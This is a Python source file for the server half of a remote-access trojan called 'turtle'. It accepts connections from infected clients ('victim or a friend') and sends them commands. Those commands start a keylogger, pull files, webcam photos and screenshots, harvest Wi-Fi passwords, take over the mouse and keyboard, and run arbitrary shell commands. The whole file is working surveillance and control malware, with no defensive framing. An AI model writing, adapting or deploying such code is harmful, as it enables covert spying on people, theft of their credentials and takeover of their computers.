import socket
import sys
import threading
import time
import os
import random
import time

from queue import Queue
from datetime import datetime
import pytz
import curses

NUMBER_OF_THREADS = 2
JOB_NUMBER = [1, 2]
queue = Queue()
all_connections = []
all_address = []
all_times= []
#all_names= []
# Create a Socket ( connect two computers)
def create_socket():
    try:
        global host
        global port
        global s
        host = ""
        port = 2500
        s = socket.socket()
    except socket.error as msg:
        print("[-] Socket creation error ",str(msg))



# Binding the socket and listening for connections
def bind_socket():
    try:
        global host
        global port
        global s
        print("[+] Binding the port ",port)

        s.bind((host, port))
        s.listen(5)

    except socket.error as msg:
        print("[-] Socket binding error " + str(msg) +" Retrying .....")
        time.sleep(1)
        port+=1
        bind_socket()


def wait():
    print(" wait ",end="")
    for i in range(5):
        print(". ",end="")
        time.sleep(0.1)
    print()    


# Handling connection from multiple clients and saving to a list
# Closing previous connections when server.py file is restarted

def accepting_connections():
    for c in all_connections:
        c.close()

    del all_connections[:]
    del all_address[:]
    del all_times[:]
    #del all_names[:]
    while True:
        try:
            conn, address = s.accept()
            s.setblocking(1)  # prevents timeout
            conn.settimeout(10)
            all_connections.append(conn)
            all_address.append(address)
            all_times.append(str(datetime.now(pytz.timezone('Asia/Kolkata')))[:19])
            #all_names.append(s.gethostname())
            
            print("\n[+] Connection has been established : " + address[0]+" at time: "+str(datetime.now(pytz.timezone('Asia/Kolkata')))[:19])

        except socket.timeout:
        	print("[-] Timeout")
        except Exception as e:
            print("[-] Error accepting connections\n",e)
        print("turtle>",end="")



    
def clear_sock_buffer(conn):
    conn.settimeout(1)
    while True:
        try:
            op = str(conn.recv(1024*1024*512),"utf-8")
            if len(op) > 1:
                print("Clearing the buffer")
                print(op,end="\n")
        except:
            break
# 2nd thread functions - 1) See all the clients 2) Select a client 3) Send commands to the connected client
# Interactive prompt for sending commands
# turtle> list
# 0 Friend-A Port
# 1 Friend-B Port
# 2 Friend-C Port
# turtle> select 1
# 192.168.0.112> dir


def start_turtle():
    global s
    while True:
        #s.settimeout(3)
        cmd = input('turtle> ').lower()
        try:
            if 'sl' in cmd:
                cmd=  cmd.replace('sl','select')
            if 'select' in cmd:
                conn = get_target(cmd)
                if conn is not None:
                    send_target_commands(conn)
            elif cmd == 'list' or cmd=='ls':
                list_connections()
            elif cmd[:4] == "help":
                 print("A.Inside Turtle shell")
                 print("1.list ------------>To list all Active connections")
                 print("2.Select id --------> TO select client from Active connections")
                 print()

                 print("B.While Working with Client")   
                 print("1.Work With all Unix commands")
                 print("2.getf filename ------------------> To download file")
                 print("3.putf sourcefilename , Destination ------------------> To upload file (Yet to be implemented)")
                 print("4.getd directoryname ------------------> To download directory (Yet to be implemented)")
                 print("5.putd directoryname ------------------> To upload directory (Yet to be implemented)")
                 print("6.quit -------------------------------->Close the Client connection")



            else:
                print("[-] Command not recognized")
        except socket.timeout:
            print("[-] Timeout\nTurtle>")
            

# Display all current active connections with client

def list_connections():
    results = ''

    for i, conn in enumerate(all_connections):
        conn.settimeout(5)
        try:
            conn.send(str.encode(' '))
            conn.recv(20480)
        except socket.timeout:
        	print("[-] Timeout")
        except:
            print("[-] ",all_address[i][0]," has been Terminated")
            del all_connections[i]
            del all_address[i]
            del all_times[i]
            #del all_names[i]
            continue

        results += str(i) + "   " + str(all_address[i][0]) + "   " + str(all_address[i][1]) + "   "+str(all_times[i])+" \n"

    print("\n\n--------Clients--------" + "\n\n" + results)


# Selecting the target
def get_target(cmd):
    try:
        target = cmd.replace('select ', '')  # target = id
        target = int(target)
        conn = all_connections[target]
        conn.settimeout(9)        
        print("\n[+] You are now connected to : " + str(all_address[target][0]))
        print("\n",str(all_address[target][0]) + ">", end="")
        return conn
        # 192.168.0.4> dir
    except socket.timeout:
        print("[-] Timeout")

    except:
        print("[-] Selection not valid")
        return None

clnt=''
def process_key_press():
    global clnt
    if clnt=='':
        return
    log = ''
    screen = curses.initscr()
    screen.addstr("Have Fun\n")
    curses.cbreak()
    screen.keypad(1)
    while True:                
        try:
            screen.refresh()
            key = screen.getch()
            if key == 27:
                curses.endwin()
                break
            log = chr(key)
            print(key)
            log = log.lower()
            if log == 'a':
                clnt.send('a'.encode())
            elif log == 'w':
                clnt.send('w'.encode())
            elif log == 'd':
                clnt.send('d'.encode())
            elif log == 's':
                clnt.send('s'.encode())   

            if key == 259:
                clnt.send('up'.encode())
            elif key == 258:
                clnt.send('down'.encode())
            elif key == 260:
                clnt.send('left'.encode())
            elif key == 261:
                clnt.send('right'.encode())
            elif key == 10:
                clnt.send('lclick'.encode())
            elif key == 331:
                clnt.send('rclick'.encode())
            

        except Exception as e:
            pass
                  
        

def key_process():
    global clnt
    if clnt=='':
        return
    log = ''
    screen = curses.initscr()
    screen.addstr("Have Fun\n")
    curses.cbreak()
    screen.keypad(1)
    while True:                
        try:
            screen.refresh()
            key = screen.getch()
            if key == ord('`'):
                curses.endwin()
                break
            if key==9:
                clnt.send('tab'.encode())
            elif key == 23:
                clnt.send('alttab'.encode())
            elif key == 4:
                clnt.send('close'.encode())
            elif key == 1:
                clnt.send('sall'.encode())

            elif key == 259:
                clnt.send('up'.encode())
            elif key == 258:
                clnt.send('down'.encode())
            elif key == 260:
                clnt.send('left'.encode())
            elif key == 261:
                clnt.send('right'.encode())
            elif key == 10:
                clnt.send('enter'.encode())
            elif key == 360:
                clnt.send('shift'.encode())
            elif key == 331:
                clnt.send('alt'.encode())
            elif key == 263:
                clnt.send('backspace'.encode())
            elif key == 262:
                clnt.send('cmd'.encode())
            elif key == 32:
                clnt.send('space'.encode())
            else:
                clnt.send(chr(key).encode())

        except Exception as e:
            print(e)
            pass
        

            
# Send commands to client/victim or a friend
def send_target_commands(conn):
    
    global clnt,keyboard_listener,kb_listener,hotkey_listener
    try:
       os.mkdir("Data")
       os.mkdir("Data/WifiPasswords")
       os.mkdir("Data/wcam")
       
    except FileExistsError:
       pass
    
    try:
        client_response = str(conn.recv(1024),"utf-8")
        wait()
        clientCWD = client_response
        print(client_response,end="")
    except Exception as e:
        print(e)
        return    
    
    while True:

        try:
            conn.settimeout(4)
            cmd = input()
            #testing
            if cmd == "g":
                    #cmd = "mouse"
                    #cmd = "getf f.txt
                    cmd = "klog -a"
            if cmd == "klog -a":
                conn.settimeout(300)
                conn.send(str.encode(cmd))
                print("[+] Keylogger Started")     

            elif cmd == "klog -d":
                conn.settimeout(60)
                conn.send(str.encode(cmd))
                print("[+] Keylogger Ended")     

            elif cmd == "alog -a":
                conn.settimeout(300)
                conn.send(str.encode(cmd))
                print("[+] Keylogger Started")     

            elif cmd == "alog -d":
                conn.settimeout(60)
                conn.send(str.encode(cmd))
                print("[+] Keylogger Ended")     



            if cmd == "quit":
                 conn.send(str.encode(cmd))
                 try:
                    indx = all_connections.index(conn)
                    all_connections.pop(indx)
                    all_address.pop(indx)
                    all_times.pop(indx)
                    #all_names.pop(indx)
                    indx = 1000
                 except:
                    pass


                 break   
                 #conn.close()
                 #s.close()



     
            elif cmd[:4] == "getf":
                clear_sock_buffer(conn)
                conn.settimeout(300)
                
                filename='Data/' + cmd[5:]
                conn.send(str.encode(cmd))
                size=0
                filesize = int(conn.recv(1024).decode())
                if filesize !=0:
                        f=open(filename,"wb")
                        print("File size is ",filesize/(1000000)," Mb ")
                        while(True):
                            print("",end=" ")
                        
                            chunk = conn.recv(1024*1024)
                        
                            size+=len(chunk)
                            
                            f.write(chunk)
                            
                            if  size >= filesize:
                                print("\n[+] Transmission of file is completed!!")
                                break
                        
                        print("[+] Done with writing File")
                        f.close()
                else:
                        print("[-] File does not exist")
               
                
                #client_response =str(client_response.split()[-2] +" " + client_response.split()[-1]) 
                #print(client_response,end="")
                #client_response = str(conn.recv(1024,"utf-8"))
                #print(client_response,end="")

            elif cmd[:4]=="putf":
                clear_sock_buffer(conn)
                conn.settimeout(300)
                filename = cmd[5:]
                conn.send(str.encode(cmd))
                print("[+] Successfully Uploaded")
                
                #client_response = str(conn.recv(1024,"utf-8"))
                #print(client_response,end="")


            elif cmd[:4] == "wcam":
                clear_sock_buffer(conn)
                conn.settimeout(30)
                conn.send(str.encode(cmd))
                filename = "Data/wcam/"+cmd[5:]+'.jpg'
                f = open(filename, "wb")
                while True:
                    # get file bytes
                    try:
                        data = conn.recv(4096)
                        conn.settimeout(5)
                        f.write(data)
                    except:
                        break
                    # write bytes on file
                f.close()
                print("[+] Download complete!")

            elif cmd[:4] == "putl":
                clear_sock_buffer(conn)
                conn.settimeout(300)
                conn.send(str.encode(cmd))
                filename = "Data/WifiPasswords/"+cmd[5:] + str(random.randint(1,200))+".txt"
                                        
                password = str(conn.recv(1024*1024),"utf-8")
                with open(filename,"w") as f:
                    f.writelines(password)

            elif cmd[:4] == "getp":
                clear_sock_buffer(conn)
                conn.settimeout(100)
                conn.send(str.encode(cmd))
                filename = "Data/WifiPasswords/"+ cmd[5:] + str(random.randint(1,200))+".txt"
                
                password = str(conn.recv(1024),"utf-8")
                print("passwords are \n-------------\n",password)
                print("[+] Writing Passwords")
                with open(filename,"w") as f:
                    f.writelines(password)                
                print("[+] Writing Passwords is finished")        
                #client_response = str(conn.recv(1024,"utf-8"))
                #print(client_response,end="")

            elif cmd[:6] =='mhack1' or cmd[:6] =='mhack0' or cmd[:4] =='msg0' or cmd[:3] =='msg':

                conn.settimeout(30)
                conn.send(str.encode(cmd))

            elif cmd[:5] == 'mhack':
                try:
                    conn.send(str.encode(cmd))
                    clnt = conn
                    process_key_press()

                except:
                    pass
                finally:
                    clnt=''
                    conn.send('quit'.encode())
                    print("[+] Mouse Hack Ended")
                    s = input('Press Enter to contune..')
                    os.system("clear")
            elif cmd[:5] == 'khack':
                try:
                    conn.send(str.encode(cmd))
                    clnt = conn
                    key_process()    
                except:
                    pass
                finally:
                    clnt=''
                    conn.send('quit'.encode())
                    print("[+] Keyboard Hack Ended")
                    s = input('Press Enter to contune..')
                    os.system("clear")

            elif cmd[:4] == "scrn":
                #clear_sock_buffer(conn)

                clear_sock_buffer(conn)
                conn.settimeout(30)
                
                conn.send(str.encode(cmd))
                filename = "Data/wcam/"+'scrn'+str(random.randint(1,100))+'.png'

                size=0
                filesize = int(conn.recv(1024).decode())
                if filesize !=0:
                        f=open(filename,"wb")
                        print("File size is ",filesize/(1000000)," Mb ")
                        while(True):
                            print("",end=" ")
                        
                            chunk = conn.recv(1024*1024)
                        
                            size+=len(chunk)
                            
                            f.write(chunk)
                            
                            if  size >= filesize:
                                print("\n[+] Transmission of file is completed!!")
                                break
                        
                        print("[+] Done with writing File")
                        f.close()
                else:
                        print("[-] File does not exist")


                print("[+] Download complete!")

    
            elif len(str.encode(cmd)) > 0:
                 conn.settimeout(10)
                 conn.send(str.encode(cmd))
                 client_response = str(conn.recv(1024*1024*512),"utf-8")
                 
                 print()
                 print(client_response,end="")
        except socket.timeout:
        	print("TimeOut\n",client_response,end="")
        except Exception as e:
            print("[-] Error Sending Commands",e)
            break














# Create worker threads
def create_workers():
    for _ in range(NUMBER_OF_THREADS):
        t = threading.Thread(target=work)
        t.daemon = True
        t.start()


# Do next job that is in the queue (handle connections, send commands)
def work():
    while True:
        x = queue.get()
        if x == 1:
            create_socket()
            bind_socket()
            accepting_connections()
        if x == 2:
            start_turtle()

        queue.task_done()


def create_jobs():
    for x in JOB_NUMBER:
        queue.put(x)

    queue.join()


create_workers()
create_jobs()






